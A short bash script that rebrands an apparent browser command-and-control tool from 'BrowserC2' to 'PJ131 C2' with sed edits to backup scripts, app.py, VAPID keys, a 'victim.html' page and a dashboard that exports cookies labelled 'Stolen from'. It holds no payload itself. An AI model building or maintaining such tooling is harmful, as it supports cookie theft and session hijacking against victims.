#!/bin/bash

echo "🔥 Rebranding to PJ131 C2..."

# Backup scripts
sed -i 's/BrowserC2/PJ131 C2/g' backup.sh
sed -i 's/browserc2/pj131c2/g' backup.sh

sed -i 's/BrowserC2/PJ131 C2/g' restore.sh
sed -i 's/browserc2/pj131c2/g' restore.sh

sed -i 's/BrowserC2/PJ131 C2/g' auto_backup.sh
sed -i 's/browserc2/pj131c2/g' auto_backup.sh

# Update cookie export in dashboard
sed -i 's/Stolen from BrowserC2/Stolen from PJ131 C2/g' templates/dashboard.html
sed -i 's/cookies_agent_/pj131_cookies_agent_/g' templates/dashboard.html

# Update victim.html title (if needed)
sed -i 's/BrowserC2/PJ131 C2/g' templates/victim.html

# Update app.py output
sed -i 's/BrowserC2/PJ131 C2/g' app.py

# Update VAPID claims
sed -i 's/browserc2/pj131c2/g' vapid_keys.py

echo "✅ Rebranding complete!"
